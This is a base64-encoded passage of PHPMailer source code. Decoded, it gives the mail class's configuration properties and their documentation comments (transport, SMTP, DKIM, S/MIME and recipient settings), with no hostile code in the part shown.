Xh0cmEgaGVhZGVycyB0aGF0IGNyZWF0ZUhlYWRlcigpIGRvZXNuJ3QgZm9sZCBpbi4KICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICovCiAgICBwcm90ZWN0ZWQgJG1haWxIZWFkZXIgPSAnJzsKCiAgICAvKioKICAgICAqIFdvcmQtd3JhcCB0aGUgbWVzc2FnZSBib2R5IHRvIHRoaXMgbnVtYmVyIG9mIGNoYXJzLgogICAgICogU2V0IHRvIDAgdG8gbm90IHdyYXAuIEEgdXNlZnVsIHZhbHVlIGhlcmUgaXMgNzgsIGZvciBSRkMyODIyIHNlY3Rpb24gMi4xLjEgY29tcGxpYW5jZS4KICAgICAqIEB2YXIgaW50ZWdlcgogICAgICovCiAgICBwdWJsaWMgJFdvcmRXcmFwID0gMDsKCiAgICAvKioKICAgICAqIFdoaWNoIG1ldGhvZCB0byB1c2UgdG8gc2VuZCBtYWlsLgogICAgICogT3B0aW9uczogIm1haWwiLCAic2VuZG1haWwiLCBvciAic210cCIuCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJE1haWxlciA9ICdtYWlsJzsKCiAgICAvKioKICAgICAqIFRoZSBwYXRoIHRvIHRoZSBzZW5kbWFpbCBwcm9ncmFtLgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRTZW5kbWFpbCA9ICcvdXNyL3NiaW4vc2VuZG1haWwnOwoKICAgIC8qKgogICAgICogV2hldGhlciBtYWlsKCkgdXNlcyBhIGZ1bGx5IHNlbmRtYWlsLWNvbXBhdGlibGUgTVRBLgogICAgICogT25lIHdoaWNoIHN1cHBvcnRzIHNlbmRtYWlsJ3MgIi1vaSAtZiIgb3B0aW9ucy4KICAgICAqIEB2YXIgYm9vbGVhbgogICAgICovCiAgICBwdWJsaWMgJFVzZVNlbmRtYWlsT3B0aW9ucyA9IHRydWU7CgogICAgLyoqCiAgICAgKiBQYXRoIHRvIFBIUE1haWxlciBwbHVnaW5zLgogICAgICogVXNlZnVsIGlmIHRoZSBTTVRQIGNsYXNzIGlzIG5vdCBpbiB0aGUgUEhQIGluY2x1ZGUgcGF0aC4KICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKiBAZGVwcmVjYXRlZCBTaG91bGQgbm90IGJlIG5lZWRlZCBub3cgdGhlcmUgaXMgYW4gYXV0b2xvYWRlci4KICAgICAqLwogICAgcHVibGljICRQbHVnaW5EaXIgPSAnJzsKCiAgICAvKioKICAgICAqIFRoZSBlbWFpbCBhZGRyZXNzIHRoYXQgYSByZWFkaW5nIGNvbmZpcm1hdGlvbiBzaG91bGQgYmUgc2VudCB0bywgYWxzbyBrbm93biBhcyByZWFkIHJlY2VpcHQuCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJENvbmZpcm1SZWFkaW5nVG8gPSAnJzsKCiAgICAvKioKICAgICAqIFRoZSBob3N0bmFtZSB0byB1c2UgaW4gdGhlIE1lc3NhZ2UtSUQgaGVhZGVyIGFuZCBhcyBkZWZhdWx0IEhFTE8gc3RyaW5nLgogICAgICogSWYgZW1wdHksIFBIUE1haWxlciBhdHRlbXB0cyB0byBmaW5kIG9uZSB3aXRoLCBpbiBvcmRlciwKICAgICAqICRfU0VSVkVSWydTRVJWRVJfTkFNRSddLCBnZXRob3N0bmFtZSgpLCBwaHBfdW5hbWUoJ24nKSwgb3IgdGhlIHZhbHVlCiAgICAgKiAnbG9jYWxob3N0LmxvY2FsZG9tYWluJy4KICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyAkSG9zdG5hbWUgPSAnJzsKCiAgICAvKioKICAgICAqIEFuIElEIHRvIGJlIHVzZWQgaW4gdGhlIE1lc3NhZ2UtSUQgaGVhZGVyLgogICAgICogSWYgZW1wdHksIGEgdW5pcXVlIGlkIHdpbGwgYmUgZ2VuZXJhdGVkLgogICAgICogWW91IGNhbiBzZXQgeW91ciBvd24sIGJ1dCBpdCBtdXN0IGJlIGluIHRoZSBmb3JtYXQgIjxpZEBkb21haW4+IiwKICAgICAqIGFzIGRlZmluZWQgaW4gUkZDNTMyMiBzZWN0aW9uIDMuNi40IG9yIGl0IHdpbGwgYmUgaWdub3JlZC4KICAgICAqIEBzZWUgaHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzUzMjIjc2VjdGlvbi0zLjYuNAogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRNZXNzYWdlSUQgPSAnJzsKCiAgICAvKioKICAgICAqIFRoZSBtZXNzYWdlIERhdGUgdG8gYmUgdXNlZCBpbiB0aGUgRGF0ZSBoZWFkZXIuCiAgICAgKiBJZiBlbXB0eSwgdGhlIGN1cnJlbnQgZGF0ZSB3aWxsIGJlIGFkZGVkLgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRNZXNzYWdlRGF0ZSA9ICcnOwoKICAgIC8qKgogICAgICogU01UUCBob3N0cy4KICAgICAqIEVpdGhlciBhIHNpbmdsZSBob3N0bmFtZSBvciBtdWx0aXBsZSBzZW1pY29sb24tZGVsaW1pdGVkIGhvc3RuYW1lcy4KICAgICAqIFlvdSBjYW4gYWxzbyBzcGVjaWZ5IGEgZGlmZmVyZW50IHBvcnQKICAgICAqIGZvciBlYWNoIGhvc3QgYnkgdXNpbmcgdGhpcyBmb3JtYXQ6IFtob3N0bmFtZTpwb3J0XQogICAgICogKGUuZy4gInNtdHAxLmV4YW1wbGUuY29tOjI1O3NtdHAyLmV4YW1wbGUuY29tIikuCiAgICAgKiBZb3UgY2FuIGFsc28gc3BlY2lmeSBlbmNyeXB0aW9uIHR5cGUsIGZvciBleGFtcGxlOgogICAgICogKGUuZy4gInRsczovL3NtdHAxLmV4YW1wbGUuY29tOjU4Nztzc2w6Ly9zbXRwMi5leGFtcGxlLmNvbTo0NjUiKS4KICAgICAqIEhvc3RzIHdpbGwgYmUgdHJpZWQgaW4gb3JkZXIuCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJEhvc3QgPSAnbG9jYWxob3N0JzsKCiAgICAvKioKICAgICAqIFRoZSBkZWZhdWx0IFNNVFAgc2VydmVyIHBvcnQuCiAgICAgKiBAdmFyIGludGVnZXIKICAgICAqIEBUT0RPIFdoeSBpcyB0aGlzIG5lZWRlZCB3aGVuIHRoZSBTTVRQIGNsYXNzIHRha2VzIGNhcmUgb2YgaXQ/CiAgICAgKi8KICAgIHB1YmxpYyAkUG9ydCA9IDI1OwoKICAgIC8qKgogICAgICogVGhlIFNNVFAgSEVMTyBvZiB0aGUgbWVzc2FnZS4KICAgICAqIERlZmF1bHQgaXMgJEhvc3RuYW1lLiBJZiAkSG9zdG5hbWUgaXMgZW1wdHksIFBIUE1haWxlciBhdHRlbXB0cyB0byBmaW5kCiAgICAgKiBvbmUgd2l0aCB0aGUgc2FtZSBtZXRob2QgZGVzY3JpYmVkIGFib3ZlIGZvciAkSG9zdG5hbWUuCiAgICAgKiBAdmFyIHN0cmluZwogICAgICogQHNlZSBQSFBNYWlsZXI6OiRIb3N0bmFtZQogICAgICovCiAgICBwdWJsaWMgJEhlbG8gPSAnJzsKCiAgICAvKioKICAgICAqIFdoYXQga2luZCBvZiBlbmNyeXB0aW9uIHRvIHVzZSBvbiB0aGUgU01UUCBjb25uZWN0aW9uLgogICAgICogT3B0aW9uczogJycsICdzc2wnIG9yICd0bHMnCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJFNNVFBTZWN1cmUgPSAnJzsKCiAgICAvKioKICAgICAqIFdoZXRoZXIgdG8gZW5hYmxlIFRMUyBlbmNyeXB0aW9uIGF1dG9tYXRpY2FsbHkgaWYgYSBzZXJ2ZXIgc3VwcG9ydHMgaXQsCiAgICAgKiBldmVuIGlmIGBTTVRQU2VjdXJlYCBpcyBub3Qgc2V0IHRvICd0bHMnLgogICAgICogQmUgYXdhcmUgdGhhdCBpbiBQSFAgPj0gNS42IHRoaXMgcmVxdWlyZXMgdGhhdCB0aGUgc2VydmVyJ3MgY2VydGlmaWNhdGVzIGFyZSB2YWxpZC4KICAgICAqIEB2YXIgYm9vbGVhbgogICAgICovCiAgICBwdWJsaWMgJFNNVFBBdXRvVExTID0gdHJ1ZTsKCiAgICAvKioKICAgICAqIFdoZXRoZXIgdG8gdXNlIFNNVFAgYXV0aGVudGljYXRpb24uCiAgICAgKiBVc2VzIHRoZSBVc2VybmFtZSBhbmQgUGFzc3dvcmQgcHJvcGVydGllcy4KICAgICAqIEB2YXIgYm9vbGVhbgogICAgICogQHNlZSBQSFBNYWlsZXI6OiRVc2VybmFtZQogICAgICogQHNlZSBQSFBNYWlsZXI6OiRQYXNzd29yZAogICAgICovCiAgICBwdWJsaWMgJFNNVFBBdXRoID0gZmFsc2U7CgogICAgLyoqCiAgICAgKiBPcHRpb25zIGFycmF5IHBhc3NlZCB0byBzdHJlYW1fY29udGV4dF9jcmVhdGUgd2hlbiBjb25uZWN0aW5nIHZpYSBTTVRQLgogICAgICogQHZhciBhcnJheQogICAgICovCiAgICBwdWJsaWMgJFNNVFBPcHRpb25zID0gYXJyYXkoKTsKCiAgICAvKioKICAgICAqIFNNVFAgdXNlcm5hbWUuCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJFVzZXJuYW1lID0gJyc7CgogICAgLyoqCiAgICAgKiBTTVRQIHBhc3N3b3JkLgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRQYXNzd29yZCA9ICcnOwoKICAgIC8qKgogICAgICogU01UUCBhdXRoIHR5cGUuCiAgICAgKiBPcHRpb25zIGFyZSBDUkFNLU1ENSwgTE9HSU4sIFBMQUlOLCBOVExNLCBYT0FVVEgyLCBhdHRlbXB0ZWQgaW4gdGhhdCBvcmRlciBpZiBub3Qgc3BlY2lmaWVkCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJEF1dGhUeXBlID0gJyc7CgogICAgLyoqCiAgICAgKiBTTVRQIHJlYWxtLgogICAgICogVXNlZCBmb3IgTlRMTSBhdXRoCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJFJlYWxtID0gJyc7CgogICAgLyoqCiAgICAgKiBTTVRQIHdvcmtzdGF0aW9uLgogICAgICogVXNlZCBmb3IgTlRMTSBhdXRoCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJFdvcmtzdGF0aW9uID0gJyc7CgogICAgLyoqCiAgICAgKiBUaGUgU01UUCBzZXJ2ZXIgdGltZW91dCBpbiBzZWNvbmRzLgogICAgICogRGVmYXVsdCBvZiA1IG1pbnV0ZXMgKDMwMHNlYykgaXMgZnJvbSBSRkMyODIxIHNlY3Rpb24gNC41LjMuMgogICAgICogQHZhciBpbnRlZ2VyCiAgICAgKi8KICAgIHB1YmxpYyAkVGltZW91dCA9IDMwMDsKCiAgICAvKioKICAgICAqIFNNVFAgY2xhc3MgZGVidWcgb3V0cHV0IG1vZGUuCiAgICAgKiBEZWJ1ZyBvdXRwdXQgbGV2ZWwuCiAgICAgKiBPcHRpb25zOgogICAgICogKiBgMGAgTm8gb3V0cHV0CiAgICAgKiAqIGAxYCBDb21tYW5kcwogICAgICogKiBgMmAgRGF0YSBhbmQgY29tbWFuZHMKICAgICAqICogYDNgIEFzIDIgcGx1cyBjb25uZWN0aW9uIHN0YXR1cwogICAgICogKiBgNGAgTG93LWxldmVsIGRhdGEgb3V0cHV0CiAgICAgKiBAdmFyIGludGVnZXIKICAgICAqIEBzZWUgU01UUDo6JGRvX2RlYnVnCiAgICAgKi8KICAgIHB1YmxpYyAkU01UUERlYnVnID0gMDsKCiAgICAvKioKICAgICAqIEhvdyB0byBoYW5kbGUgZGVidWcgb3V0cHV0LgogICAgICogT3B0aW9uczoKICAgICAqICogYGVjaG9gIE91dHB1dCBwbGFpbi10ZXh0IGFzLWlzLCBhcHByb3ByaWF0ZSBmb3IgQ0xJCiAgICAgKiAqIGBodG1sYCBPdXRwdXQgZXNjYXBlZCwgbGluZSBicmVha3MgY29udmVydGVkIHRvIGA8YnI+YCwgYXBwcm9wcmlhdGUgZm9yIGJyb3dzZXIgb3V0cHV0CiAgICAgKiAqIGBlcnJvcl9sb2dgIE91dHB1dCB0byBlcnJvciBsb2cgYXMgY29uZmlndXJlZCBpbiBwaHAuaW5pCiAgICAgKgogICAgICogQWx0ZXJuYXRpdmVseSwgeW91IGNhbiBwcm92aWRlIGEgY2FsbGFibGUgZXhwZWN0aW5nIHR3byBwYXJhbXM6IGEgbWVzc2FnZSBzdHJpbmcgYW5kIHRoZSBkZWJ1ZyBsZXZlbDoKICAgICAqIDxjb2RlPgogICAgICogJG1haWwtPkRlYnVnb3V0cHV0ID0gZnVuY3Rpb24oJHN0ciwgJGxldmVsKSB7ZWNobyAiZGVidWcgbGV2ZWwgJGxldmVsOyBtZXNzYWdlOiAkc3RyIjt9OwogICAgICogPC9jb2RlPgogICAgICogQHZhciBzdHJpbmd8Y2FsbGFibGUKICAgICAqIEBzZWUgU01UUDo6JERlYnVnb3V0cHV0CiAgICAgKi8KICAgIHB1YmxpYyAkRGVidWdvdXRwdXQgPSAnZWNobyc7CgogICAgLyoqCiAgICAgKiBXaGV0aGVyIHRvIGtlZXAgU01UUCBjb25uZWN0aW9uIG9wZW4gYWZ0ZXIgZWFjaCBtZXNzYWdlLgogICAgICogSWYgdGhpcyBpcyBzZXQgdG8gdHJ1ZSB0aGVuIHRvIGNsb3NlIHRoZSBjb25uZWN0aW9uCiAgICAgKiByZXF1aXJlcyBhbiBleHBsaWNpdCBjYWxsIHRvIHNtdHBDbG9zZSgpLgogICAgICogQHZhciBib29sZWFuCiAgICAgKi8KICAgIHB1YmxpYyAkU01UUEtlZXBBbGl2ZSA9IGZhbHNlOwoKICAgIC8qKgogICAgICogV2hldGhlciB0byBzcGxpdCBtdWx0aXBsZSB0byBhZGRyZXNzZXMgaW50byBtdWx0aXBsZSBtZXNzYWdlcwogICAgICogb3Igc2VuZCB0aGVtIGFsbCBpbiBvbmUgbWVzc2FnZS4KICAgICAqIE9ubHkgc3VwcG9ydGVkIGluIGBtYWlsYCBhbmQgYHNlbmRtYWlsYCB0cmFuc3BvcnRzLCBub3QgaW4gU01UUC4KICAgICAqIEB2YXIgYm9vbGVhbgogICAgICovCiAgICBwdWJsaWMgJFNpbmdsZVRvID0gZmFsc2U7CgogICAgLyoqCiAgICAgKiBTdG9yYWdlIGZvciBhZGRyZXNzZXMgd2hlbiBTaW5nbGVUbyBpcyBlbmFibGVkLgogICAgICogQHZhciBhcnJheQogICAgICogQFRPRE8gVGhpcyBzaG91bGQgcmVhbGx5IG5vdCBiZSBwdWJsaWMKICAgICAqLwogICAgcHVibGljICRTaW5nbGVUb0FycmF5ID0gYXJyYXkoKTsKCiAgICAvKioKICAgICAqIFdoZXRoZXIgdG8gZ2VuZXJhdGUgVkVSUCBhZGRyZXNzZXMgb24gc2VuZC4KICAgICAqIE9ubHkgYXBwbGljYWJsZSB3aGVuIHNlbmRpbmcgdmlhIFNNVFAuCiAgICAgKiBAbGluayBodHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9WYXJpYWJsZV9lbnZlbG9wZV9yZXR1cm5fcGF0aAogICAgICogQGxpbmsgaHR0cDovL3d3dy5wb3N0Zml4Lm9yZy9WRVJQX1JFQURNRS5odG1sIFBvc3RmaXggVkVSUCBpbmZvCiAgICAgKiBAdmFyIGJvb2xlYW4KICAgICAqLwogICAgcHVibGljICRkb192ZXJwID0gZmFsc2U7CgogICAgLyoqCiAgICAgKiBXaGV0aGVyIHRvIGFsbG93IHNlbmRpbmcgbWVzc2FnZXMgd2l0aCBhbiBlbXB0eSBib2R5LgogICAgICogQHZhciBib29sZWFuCiAgICAgKi8KICAgIHB1YmxpYyAkQWxsb3dFbXB0eSA9IGZhbHNlOwoKICAgIC8qKgogICAgICogVGhlIGRlZmF1bHQgbGluZSBlbmRpbmcuCiAgICAgKiBAbm90ZSBUaGUgZGVmYXVsdCByZW1haW5zICIKIi4gV2UgZm9yY2UgQ1JMRiB3aGVyZSB3ZSBrbm93CiAgICAgKiAgICAgICAgaXQgbXVzdCBiZSB1c2VkIHZpYSBzZWxmOjpDUkxGLgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRMRSA9ICIKIjsKCiAgICAvKioKICAgICAqIERLSU0gc2VsZWN0b3IuCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJERLSU1fc2VsZWN0b3IgPSAnJzsKCiAgICAvKioKICAgICAqIERLSU0gSWRlbnRpdHkuCiAgICAgKiBVc3VhbGx5IHRoZSBlbWFpbCBhZGRyZXNzIHVzZWQgYXMgdGhlIHNvdXJjZSBvZiB0aGUgZW1haWwuCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJERLSU1faWRlbnRpdHkgPSAnJzsKCiAgICAvKioKICAgICAqIERLSU0gcGFzc3BocmFzZS4KICAgICAqIFVzZWQgaWYgeW91ciBrZXkgaXMgZW5jcnlwdGVkLgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRES0lNX3Bhc3NwaHJhc2UgPSAnJzsKCiAgICAvKioKICAgICAqIERLSU0gc2lnbmluZyBkb21haW4gbmFtZS4KICAgICAqIEBleGFtcGxlICdleGFtcGxlLmNvbScKICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyAkREtJTV9kb21haW4gPSAnJzsKCiAgICAvKioKICAgICAqIERLSU0gcHJpdmF0ZSBrZXkgZmlsZSBwYXRoLgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRES0lNX3ByaXZhdGUgPSAnJzsKCiAgICAvKioKICAgICAqIERLSU0gcHJpdmF0ZSBrZXkgc3RyaW5nLgogICAgICogSWYgc2V0LCB0YWtlcyBwcmVjZWRlbmNlIG92ZXIgYCRES0lNX3ByaXZhdGVgLgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRES0lNX3ByaXZhdGVfc3RyaW5nID0gJyc7CgogICAgLyoqCiAgICAgKiBDYWxsYmFjayBBY3Rpb24gZnVuY3Rpb24gbmFtZS4KICAgICAqCiAgICAgKiBUaGUgZnVuY3Rpb24gdGhhdCBoYW5kbGVzIHRoZSByZXN1bHQgb2YgdGhlIHNlbmQgZW1haWwgYWN0aW9uLgogICAgICogSXQgaXMgY2FsbGVkIG91dCBieSBzZW5kKCkgZm9yIGVhY2ggZW1haWwgc2VudC4KICAgICAqCiAgICAgKiBWYWx1ZSBjYW4gYmUgYW55IHBocCBjYWxsYWJsZTogaHR0cDovL3d3dy5waHAubmV0L2lzX2NhbGxhYmxlCiAgICAgKgogICAgICogUGFyYW1ldGVyczoKICAgICAqICAgYm9vbGVhbiAkcmVzdWx0ICAgICAgICByZXN1bHQgb2YgdGhlIHNlbmQgYWN0aW9uCiAgICAgKiAgIGFycmF5ICAgJHRvICAgICAgICAgICAgZW1haWwgYWRkcmVzc2VzIG9mIHRoZSByZWNpcGllbnRzCiAgICAgKiAgIGFycmF5ICAgJGNjICAgICAgICAgICAgY2MgZW1haWwgYWRkcmVzc2VzCiAgICAgKiAgIGFycmF5ICAgJGJjYyAgICAgICAgICAgYmNjIGVtYWlsIGFkZHJlc3NlcwogICAgICogICBzdHJpbmcgICRzdWJqZWN0ICAgICAgIHRoZSBzdWJqZWN0CiAgICAgKiAgIHN0cmluZyAgJGJvZHkgICAgICAgICAgdGhlIGVtYWlsIGJvZHkKICAgICAqICAgc3RyaW5nICAkZnJvbSAgICAgICAgICBlbWFpbCBhZGRyZXNzIG9mIHNlbmRlcgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRhY3Rpb25fZnVuY3Rpb24gPSAnJzsKCiAgICAvKioKICAgICAqIFdoYXQgdG8gcHV0IGluIHRoZSBYLU1haWxlciBoZWFkZXIuCiAgICAgKiBPcHRpb25zOiBBbiBlbXB0eSBzdHJpbmcgZm9yIFBIUE1haWxlciBkZWZhdWx0LCB3aGl0ZXNwYWNlIGZvciBub25lLCBvciBhIHN0cmluZyB0byB1c2UKICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyAkWE1haWxlciA9ICcgJzsKCiAgICAvKioKICAgICAqIFdoaWNoIHZhbGlkYXRvciB0byB1c2UgYnkgZGVmYXVsdCB3aGVuIHZhbGlkYXRpbmcgZW1haWwgYWRkcmVzc2VzLgogICAgICogTWF5IGJlIGEgY2FsbGFibGUgdG8gaW5qZWN0IHlvdXIgb3duIHZhbGlkYXRvciwgYnV0IHRoZXJlIGFyZSBzZXZlcmFsIGJ1aWx0LWluIHZhbGlkYXRvcnMuCiAgICAgKiBAc2VlIFBIUE1haWxlcjo6dmFsaWRhdGVBZGRyZXNzKCkKICAgICAqIEB2YXIgc3RyaW5nfGNhbGxhYmxlCiAgICAgKiBAc3RhdGljCiAgICAgKi8KICAgIHB1YmxpYyBzdGF0aWMgJHZhbGlkYXRvciA9ICdhdXRvJzsKCiAgICAvKioKICAgICAqIEFuIGluc3RhbmNlIG9mIHRoZSBTTVRQIHNlbmRlciBjbGFzcy4KICAgICAqIEB2YXIgU01UUAogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqLwogICAgcHJvdGVjdGVkICRzbXRwID0gbnVsbDsKCiAgICAvKioKICAgICAqIFRoZSBhcnJheSBvZiAndG8nIG5hbWVzIGFuZCBhZGRyZXNzZXMuCiAgICAgKiBAdmFyIGFycmF5CiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICovCiAgICBwcm90ZWN0ZWQgJHRvID0gYXJyYXkoKTsKCiAgICAvKioKICAgICAqIFRoZSBhcnJheSBvZiAnY2MnIG5hbWVzIGFuZCBhZGRyZXNzZXMuCiAgICAgKiBAdmFyIGFycmF5CiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICovCiAgICBwcm90ZWN0ZWQgJGNjID0gYXJyYXkoKTsKCiAgICAvKioKICAgICAqIFRoZSBhcnJheSBvZiAnYmNjJyBuYW1lcyBhbmQgYWRkcmVzc2VzLgogICAgICogQHZhciBhcnJheQogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqLwogICAgcHJvdGVjdGVkICRiY2MgPSBhcnJheSgpOwoKICAgIC8qKgogICAgICogVGhlIGFycmF5IG9mIHJlcGx5LXRvIG5hbWVzIGFuZCBhZGRyZXNzZXMuCiAgICAgKiBAdmFyIGFycmF5CiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICovCiAgICBwcm90ZWN0ZWQgJFJlcGx5VG8gPSBhcnJheSgpOwoKICAgIC8qKgogICAgICogQW4gYXJyYXkgb2YgYWxsIGtpbmRzIG9mIGFkZHJlc3Nlcy4KICAgICAqIEluY2x1ZGVzIGFsbCBvZiAkdG8sICRjYywgJGJjYwogICAgICogQHZhciBhcnJheQogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqIEBzZWUgUEhQTWFpbGVyOjokdG8gQHNlZSBQSFBNYWlsZXI6OiRjYyBAc2VlIFBIUE1haWxlcjo6JGJjYwogICAgICovCiAgICBwcm90ZWN0ZWQgJGFsbF9yZWNpcGllbnRzID0gYXJyYXkoKTsKCiAgICAvKioKICAgICAqIEFuIGFycmF5IG9mIG5hbWVzIGFuZCBhZGRyZXNzZXMgcXVldWVkIGZvciB2YWxpZGF0aW9uLgogICAgICogSW4gc2VuZCgpLCB2YWxpZCBhbmQgbm9uIGR1cGxpY2F0ZSBlbnRyaWVzIGFyZSBtb3ZlZCB0byAkYWxsX3JlY2lwaWVudHMKICAgICAqIGFuZCBvbmUgb2YgJHRvLCAkY2MsIG9yICRiY2MuCiAgICAgKiBUaGlzIGFycmF5IGlzIHVzZWQgb25seSBmb3IgYWRkcmVzc2VzIHdpdGggSUROLgogICAgICogQHZhciBhcnJheQogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqIEBzZWUgUEhQTWFpbGVyOjokdG8gQHNlZSBQSFBNYWlsZXI6OiRjYyBAc2VlIFBIUE1haWxlcjo6JGJjYwogICAgICogQHNlZSBQSFBNYWlsZXI6OiRhbGxfcmVjaXBpZW50cwogICAgICovCiAgICBwcm90ZWN0ZWQgJFJlY2lwaWVudHNRdWV1ZSA9IGFycmF5KCk7CgogICAgLyoqCiAgICAgKiBBbiBhcnJheSBvZiByZXBseS10byBuYW1lcyBhbmQgYWRkcmVzc2VzIHF1ZXVlZCBmb3IgdmFsaWRhdGlvbi4KICAgICAqIEluIHNlbmQoKSwgdmFsaWQgYW5kIG5vbiBkdXBsaWNhdGUgZW50cmllcyBhcmUgbW92ZWQgdG8gJFJlcGx5VG8uCiAgICAgKiBUaGlzIGFycmF5IGlzIHVzZWQgb25seSBmb3IgYWRkcmVzc2VzIHdpdGggSUROLgogICAgICogQHZhciBhcnJheQogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqIEBzZWUgUEhQTWFpbGVyOjokUmVwbHlUbwogICAgICovCiAgICBwcm90ZWN0ZWQgJFJlcGx5VG9RdWV1ZSA9IGFycmF5KCk7CgogICAgLyoqCiAgICAgKiBUaGUgYXJyYXkgb2YgYXR0YWNobWVudHMuCiAgICAgKiBAdmFyIGFycmF5CiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICovCiAgICBwcm90ZWN0ZWQgJGF0dGFjaG1lbnQgPSBhcnJheSgpOwoKICAgIC8qKgogICAgICogVGhlIGFycmF5IG9mIGN1c3RvbSBoZWFkZXJzLgogICAgICogQHZhciBhcnJheQogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqLwogICAgcHJvdGVjdGVkICRDdXN0b21IZWFkZXIgPSBhcnJheSgpOwoKICAgIC8qKgogICAgICogVGhlIG1vc3QgcmVjZW50IE1lc3NhZ2UtSUQgKGluY2x1ZGluZyBhbmd1bGFyIGJyYWNrZXRzKS4KICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICovCiAgICBwcm90ZWN0ZWQgJGxhc3RNZXNzYWdlSUQgPSAnJzsKCiAgICAvKioKICAgICAqIFRoZSBtZXNzYWdlJ3MgTUlNRSB0eXBlLgogICAgICogQHZhciBzdHJpbmcKICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkCiAgICAgKi8KICAgIHByb3RlY3RlZCAkbWVzc2FnZV90eXBlID0gJyc7CgogICAgLyoqCiAgICAgKiBUaGUgYXJyYXkgb2YgTUlNRSBib3VuZGFyeSBzdHJpbmdzLgogICAgICogQHZhciBhcnJheQogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqLwogICAgcHJvdGVjdGVkICRib3VuZGFyeSA9IGFycmF5KCk7CgogICAgLyoqCiAgICAgKiBUaGUgYXJyYXkgb2YgYXZhaWxhYmxlIGxhbmd1YWdlcy4KICAgICAqIEB2YXIgYXJyYXkKICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkCiAgICAgKi8KICAgIHByb3RlY3RlZCAkbGFuZ3VhZ2UgPSBhcnJheSgpOwoKICAgIC8qKgogICAgICogVGhlIG51bWJlciBvZiBlcnJvcnMgZW5jb3VudGVyZWQuCiAgICAgKiBAdmFyIGludGVnZXIKICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkCiAgICAgKi8KICAgIHByb3RlY3RlZCAkZXJyb3JfY291bnQgPSAwOwoKICAgIC8qKgogICAgICogVGhlIFMvTUlNRSBjZXJ0aWZpY2F0ZSBmaWxlIHBhdGguCiAgICAgKiBAdmFyIHN0cmluZwogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqLwogICAgcHJvdGVjdGVkICRzaWduX2NlcnRfZmlsZSA9ICcnOwoKICAgIC8qKgogICAgICogVGhlIFMvTUlNRSBrZXkgZmlsZSBwYXRoLgogICAgICogQHZhciBzdHJpbmcKICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkCiAgICAgKi8KICAgIHByb3RlY3RlZCAkc2lnbl9rZXlfZmlsZSA9ICcnOwoKICAgIC8qKgogICAgICogVGhlIG9wdGlvbmFsIFMvTUlNRSBleHRyYSBjZXJ0aWZpY2F0ZXMgKCJDQSBDaGFpbiIpIGZpbGUgcGF0aC4KICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICovCiAgICBwcm90ZWN0ZWQgJHNpZ25fZXh0cmFjZXJ0c19maWxlID0gJyc7CgogICAgLyoqCiAgICAgKiBUaGUgUy9NSU1FIHBhc3N3b3JkIGZvciB0aGUga2V5LgogICAgICogVXNlZCBvbmx5IGlmIHRoZSBrZXkgaXMgZW5jcnlwdGVkLgogICAgICogQHZhciBzdHJpbmcKICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkCiAgICAgKi8KICAgIHByb3RlY3RlZCAkc2lnbl9rZXlfcGFzcyA9ICcnOwoKICAgIC8qKgogICAgICogV2hldGhlciB0byB0aHJvdyBleGNlcHRpb25zIGZvciBlcnJvcnMuCiAgICAgKiBAdmFyIGJvb2xlYW4KICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkCiAgICAgKi8KICAgIHByb3RlY3RlZCAkZXhjZXB0aW9ucyA9IGZhbHNlOwoKICAgIC8qKgog